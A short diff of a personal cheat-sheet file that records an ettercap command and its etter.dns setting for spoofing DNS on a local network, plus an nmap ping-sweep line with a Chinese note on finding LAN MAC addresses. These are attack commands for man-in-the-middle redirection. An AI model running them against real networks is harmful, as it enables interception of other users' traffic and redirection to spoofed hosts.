@@ -1,6 +1,9 @@
 
-Commad : ettercap -T -q -i eth0 -P dns_spoof // //
-
-Configure : /usr/share/ettercap/etter.dns
+O - Commad : ettercap -T -q -i eth0 -P dns_spoof // //
+  o - Configure : /usr/share/ettercap/etter.dns
             *.com   A  192.168.x.x
+
+
+O - nmap 在root权限下获取局域网mac地址
+  o - nmap -sp -PI -PT 192.168.10.*
 
